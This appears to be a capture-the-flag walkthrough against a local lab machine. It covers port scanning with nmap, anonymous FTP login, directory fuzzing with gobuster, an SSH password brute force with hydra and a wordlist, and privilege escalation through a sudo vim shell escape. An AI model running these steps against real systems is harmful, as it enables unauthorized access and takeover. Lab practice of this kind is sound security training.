![image](https://github.com/user-attachments/assets/8136e17b-e899-4a64-9bba-715e2cfa250d)
```bash
ping -c 1 172.17.0.2
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
nmap -sCV -p21,22,80 172.17.0.2 -oN targeted
```
![Pasted image 20250122141033](https://github.com/user-attachments/assets/92db60ea-95b0-4044-acf1-8f3dd1fbe5a2)

## **we can also see that the user 'anonymous' is activated by ftp**

## **we can log in**
```bash
ftp 172.17.0.2
```
![Pasted image 20250122141248](https://github.com/user-attachments/assets/ed0d05d8-a940-4ab0-a0eb-81c4fc30b275)

## **as we can see we are inside a directory where there are only 2 files and we cannot move to another location.**

![Pasted image 20250122141716](https://github.com/user-attachments/assets/8de3cf51-9c65-484b-af5a-8bbd66b1110a)
![Pasted image 20250122141810](https://github.com/user-attachments/assets/ea0c2d81-ff38-4250-b097-66926c2b2888)
![Pasted image 20250122141848](https://github.com/user-attachments/assets/26e897c9-6742-40e5-aec9-c531d42d20b7)

## **from this we can assume that we have two users 'Gonza' and 'russoski'**

## **let's continue investigating other resources since we have users but no passwords.**

![Pasted image 20250122142008](https://github.com/user-attachments/assets/5e6007d7-b9e5-4db8-8d4b-3d700b466cf9)

## **in the source code we found something interesting**

![Pasted image 20250122142050](https://github.com/user-attachments/assets/4d4520b7-265a-4f66-b337-f9baf0e7a9a6)

## **we continue to see russoski user mentioned**

![Pasted image 20250122142125](https://github.com/user-attachments/assets/72159de8-0833-4592-97b1-858413ed2df9)

## **we now fuzzing to find hidden directories**
```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x txt,py,php,sh
```
![Pasted image 20250122142329](https://github.com/user-attachments/assets/db66471e-0ae6-4e71-8a0f-9dbec112e418)
![Pasted image 20250122142351](https://github.com/user-attachments/assets/8cbe125b-2029-40b8-a394-dc2aa59673d3)
![Pasted image 20250122142410](https://github.com/user-attachments/assets/a178d0c7-552c-44e2-a8e8-dee6bb39601a)

##**now if we are sure of the user with which we will get access, we are going to make a brute force attack and this time through the SSH protocol.**
```bash
hydra -l russoski -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 10 -I
```
![Pasted image 20250122142557](https://github.com/user-attachments/assets/d424ed37-6942-46b8-85f2-0c90ce1e6836)

```bash
ssh russoski@172.17.0.2
```
```bash
sudo -l
```
![Pasted image 20250122142707](https://github.com/user-attachments/assets/38fa7853-eb1b-4f3d-9a70-8e08da5435d6)

```bash
sudo vim -c ':!/bin/sh'
```
![Pasted image 20250122142807](https://github.com/user-attachments/assets/07b7c11d-68ac-467a-94bb-5844aeca5ecf)
